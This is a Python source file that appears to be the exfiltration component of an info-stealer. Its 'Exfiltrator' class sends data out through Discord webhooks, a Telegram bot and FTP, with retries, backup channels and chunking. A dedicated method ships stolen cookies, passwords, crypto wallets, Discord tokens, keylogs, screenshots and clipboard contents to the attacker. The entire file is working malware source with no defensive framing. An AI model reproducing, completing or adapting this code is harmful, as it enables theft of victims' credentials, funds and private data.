import os
import sys
import json
import time
import base64
import shutil
import tempfile
import threading
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple

try:
    import requests
except ImportError:
    pass

class Exfiltrator:
    def __init__(self, config=None):
        self.config = config or {}
        self.webhook_url = self.config.get("webhook", "")
        self.backup_webhook = self.config.get("backup_webhook", "")
        self.telegram_token = self.config.get("telegram_token", "")
        self.telegram_chat_id = self.config.get("telegram_chat_id", "")
        self.ftp_host = self.config.get("ftp_host", "")
        self.ftp_user = self.config.get("ftp_user", "")
        self.ftp_pass = self.config.get("ftp_pass", "")
        self.exfil_mode = self.config.get("exfil_mode", "discord")
        self.max_retries = self.config.get("max_retries", 5)
        self.retry_delay = self.config.get("retry_delay", 10)
        self.temp_dir = tempfile.gettempdir()
        
    def send_to_discord(self, data, webhook_url=None):
        if webhook_url is None:
            webhook_url = self.webhook_url
        
        if not webhook_url:
            return False
        
        try:
            # Prepare payload
            if isinstance(data, dict):
                payload = data
            else:
                payload = {"content": str(data)}
            
            response = requests.post(webhook_url, json=payload, timeout=30)
            
            return response.status_code == 204 or response.status_code == 200
        except:
            return False
    
    def send_to_discord_with_retry(self, data, webhook_url=None):
        for attempt in range(self.max_retries):
            if self.send_to_discord(data, webhook_url):
                return True
            
            if attempt < self.max_retries - 1:
                time.sleep(self.retry_delay * (attempt + 1))
        
        return False
    
    def send_file_to_discord(self, file_path, webhook_url=None):
        if webhook_url is None:
            webhook_url = self.webhook_url
        
        if not webhook_url:
            return False
        
        try:
            with open(file_path, "rb") as f:
                files = {"file": f}
                response = requests.post(webhook_url, files=files, timeout=60)
                
                return response.status_code == 204 or response.status_code == 200
        except:
            return False
    
    def send_to_telegram(self, message, bot_token=None, chat_id=None):
        if bot_token is None:
            bot_token = self.telegram_token
        
        if chat_id is None:
            chat_id = self.telegram_chat_id
        
        if not bot_token or not chat_id:
            return False
        
        try:
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            data = {
                "chat_id": chat_id,
                "text": message
            }
            
            response = requests.post(url, json=data, timeout=30)
            
            return response.status_code == 200
        except:
            return False
    
    def send_file_to_telegram(self, file_path, bot_token=None, chat_id=None):
        if bot_token is None:
            bot_token = self.telegram_token
        
        if chat_id is None:
            chat_id = self.telegram_chat_id
        
        if not bot_token or not chat_id:
            return False
        
        try:
            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            
            with open(file_path, "rb") as f:
                files = {"document": f}
                data = {"chat_id": chat_id}
                
                response = requests.post(url, files=files, data=data, timeout=60)
                
                return response.status_code == 200
        except:
            return False
    
    def upload_to_ftp(self, file_path, ftp_host=None, username=None, password=None):
        if ftp_host is None:
            ftp_host = self.ftp_host
        
        if username is None:
            username = self.ftp_user
        
        if password is None:
            password = self.ftp_pass
        
        if not ftp_host or not username or not password:
            return False
        
        try:
            from ftplib import FTP
            
            ftp = FTP(ftp_host)
            ftp.login(username, password)
            
            remote_filename = os.path.basename(file_path)
            
            with open(file_path, "rb") as f:
                ftp.storbinary(f"STOR {remote_filename}", f)
            
            ftp.quit()
            return True
        except:
            return False
    
    def format_data_for_discord(self, data, title="Data"):
        try:
            if isinstance(data, dict):
                data_str = json.dumps(data, indent=2, default=str)
            elif isinstance(data, list):
                data_str = json.dumps(data, indent=2, default=str)
            else:
                data_str = str(data)
            
            # Split into chunks if too large
            max_length = 1900
            chunks = []
            
            for i in range(0, len(data_str), max_length):
                chunks.append(data_str[i:i+max_length])
            
            embeds = []
            
            for i, chunk in enumerate(chunks[:10]):  # Limit to 10 embeds
                embed = {
                    "title": f"{title} - Part {i+1}",
                    "description": f"```json\n{chunk}\n```",
                    "color": 0x00ff00
                }
                embeds.append(embed)
            
            return {"embeds": embeds}
        except:
            return {"content": str(data)}
    
    def save_data_to_file(self, data, filename=None):
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"exfil_{timestamp}.json"
        
        file_path = os.path.join(self.temp_dir, filename)
        
        try:
            with open(file_path, "w", encoding="utf-8") as f:
                if isinstance(data, dict) or isinstance(data, list):
                    json.dump(data, f, indent=2, default=str)
                else:
                    f.write(str(data))
            
            return file_path
        except:
            return None
    
    def create_zip_from_data(self, data, zip_name=None):
        if zip_name is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            zip_name = f"exfil_{timestamp}.zip"
        
        zip_path = os.path.join(self.temp_dir, zip_name)
        
        try:
            import zipfile
            
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
                if isinstance(data, dict):
                    for key, value in data.items():
                        json_data = json.dumps(value, indent=2, default=str)
                        zipf.writestr(f"{key}.json", json_data)
                elif isinstance(data, list):
                    json_data = json.dumps(data, indent=2, default=str)
                    zipf.writestr("data.json", json_data)
                else:
                    zipf.writestr("data.txt", str(data))
            
            return zip_path
        except:
            return None
    
    def exfiltrate_data(self, data, method=None):
        if method is None:
            method = self.exfil_mode
        
        results = {
            "discord": False,
            "telegram": False,
            "ftp": False
        }
        
        if method == "discord" or method == "all":
            formatted_data = self.format_data_for_discord(data)
            results["discord"] = self.send_to_discord_with_retry(formatted_data)
            
            if not results["discord"] and self.backup_webhook:
                results["discord"] = self.send_to_discord_with_retry(formatted_data, self.backup_webhook)
        
        if method == "telegram" or method == "all":
            if isinstance(data, dict):
                data_str = json.dumps(data, indent=2, default=str)
            else:
                data_str = str(data)
            
            results["telegram"] = self.send_to_telegram(data_str[:4000])
        
        if method == "ftp" or method == "all":
            file_path = self.save_data_to_file(data)
            
            if file_path:
                results["ftp"] = self.upload_to_ftp(file_path)
        
        return results
    
    def exfiltrate_file(self, file_path, method=None):
        if method is None:
            method = self.exfil_mode
        
        results = {
            "discord": False,
            "telegram": False,
            "ftp": False
        }
        
        if method == "discord" or method == "all":
            results["discord"] = self.send_file_to_discord(file_path)
        
        if method == "telegram" or method == "all":
            results["telegram"] = self.send_file_to_telegram(file_path)
        
        if method == "ftp" or method == "all":
            results["ftp"] = self.upload_to_ftp(file_path)
        
        return results
    
    def exfiltrate_large_data(self, data, chunk_size=50000):
        results = {
            "total_chunks": 0,
            "successful_chunks": 0,
            "failed_chunks": 0
        }
        
        # Convert to string
        if isinstance(data, dict) or isinstance(data, list):
            data_str = json.dumps(data, default=str)
        else:
            data_str = str(data)
        
        # Split into chunks
        chunks = []
        for i in range(0, len(data_str), chunk_size):
            chunks.append(data_str[i:i+chunk_size])
        
        results["total_chunks"] = len(chunks)
        
        for i, chunk in enumerate(chunks):
            payload = {
                "content": f"Chunk {i+1}/{len(chunks)}:\n```\n{chunk}\n```"
            }
            
            if self.send_to_discord_with_retry(payload):
                results["successful_chunks"] += 1
            else:
                results["failed_chunks"] += 1
            
            time.sleep(1)  # Rate limiting
        
        return results
    
    def exfiltrate_collected_data(self, collected_data):
        results = {
            "system_info": False,
            "cookies": False,
            "passwords": False,
            "wallets": False,
            "discord_tokens": False,
            "telegram": False,
            "files": False,
            "keylogs": False,
            "screenshots": False,
            "clipboard": False
        }
        
        # Exfiltrate each type of data
        if "system" in collected_data:
            results["system_info"] = self.exfiltrate_data(
                collected_data["system"],
                method="discord"
            )
        
        if "cookies" in collected_data:
            results["cookies"] = self.exfiltrate_data(
                {"cookies": collected_data["cookies"][:100]},
                method="discord"
            )
        
        if "passwords" in collected_data:
            results["passwords"] = self.exfiltrate_data(
                {"passwords": collected_data["passwords"][:50]},
                method="discord"
            )
        
        if "wallets" in collected_data:
            results["wallets"] = self.exfiltrate_data(
                {"wallets": collected_data["wallets"]},
                method="discord"
            )
        
        if "discord_tokens" in collected_data:
            results["discord_tokens"] = self.exfiltrate_data(
                {"tokens": collected_data["discord_tokens"]},
                method="discord"
            )
        
        if "telegram" in collected_data:
            results["telegram"] = self.exfiltrate_data(
                {"telegram": collected_data["telegram"]},
                method="discord"
            )
        
        if "files" in collected_data:
            results["files"] = self.exfiltrate_data(
                {"files": collected_data["files"][:20]},
                method="discord"
            )
        
        if "keylogs" in collected_data:
            results["keylogs"] = self.exfiltrate_data(
                {"keylogs": collected_data["keylogs"]},
                method="discord"
            )
        
        if "screenshots" in collected_data:
            results["screenshots"] = self.exfiltrate_data(
                {"screenshots": collected_data["screenshots"][:5]},
                method="discord"
            )
        
        if "clipboard" in collected_data:
            results["clipboard"] = self.exfiltrate_data(
                {"clipboard": collected_data["clipboard"]},
                method="discord"
            )
        
        return results

if __name__ == "__main__":
    exfil = Exfiltrator({"webhook": "https://discord.com/api/webhooks/REPLACE"})
    
    test_data = {
        "test": "This is test data",
        "timestamp": datetime.now().isoformat()
    }
    
    results = exfil.exfiltrate_data(test_data)
    print(f"Exfiltration results: {results}")